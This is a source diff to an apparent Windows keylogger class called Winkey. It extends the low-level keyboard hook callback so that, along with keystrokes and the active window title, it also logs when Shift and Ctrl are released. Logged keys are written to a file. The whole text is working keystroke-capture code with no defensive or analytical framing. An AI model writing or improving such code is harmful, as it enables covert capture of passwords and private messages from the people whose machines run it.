@@ -99,7 +99,7 @@ int Winkey::Hook() {
 */
 LRESULT CALLBACK Winkey::onKey(int nCode, WPARAM wParam, LPARAM lParam) {
 	/* If a Key has been pressed */
-	if (wParam == WM_KEYDOWN) {
+	if (wParam == WM_KEYDOWN || wParam == WM_KEYUP) {
 		/* Align data */
 		KBDLLHOOKSTRUCT* kbdEv = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
 
@@ -107,7 +107,31 @@ LRESULT CALLBACK Winkey::onKey(int nCode, WPARAM wParam, LPARAM lParam) {
 		logCurrentWindow();
 
 		/* Solving key */
-		const std::string to_write = solve(kbdEv);
+		std::string to_write = "";
+		if (wParam == WM_KEYDOWN) {
+			to_write = solve(kbdEv);
+		}
+		else if (wParam == WM_KEYUP) {
+			/* Log release of shift and ctrl */
+			switch (kbdEv->vkCode) {
+			case VK_SHIFT:
+			case VK_LSHIFT:
+			case VK_RSHIFT:
+				to_write = std::string("[/SHIFT]");
+				break;
+			case VK_CONTROL:
+			case VK_LCONTROL:
+			case VK_RCONTROL:
+				to_write = std::string("[/CTRL]");
+				break;
+			default:;
+			}
+		}
+
+		/* Early skip */
+		if (to_write.length() == 0) {
+			return CallNextHookEx(NULL, nCode, wParam, lParam);
+		}
 
 		/* Writing key to file */
 		DWORD bytesWrote;
@@ -183,6 +207,7 @@ std::string Winkey::solve(KBDLLHOOKSTRUCT *kbdEv) {
 		);
 
 		std::string fmt(unicodeBuffer);
+
 		return fmt;
 	}
 }
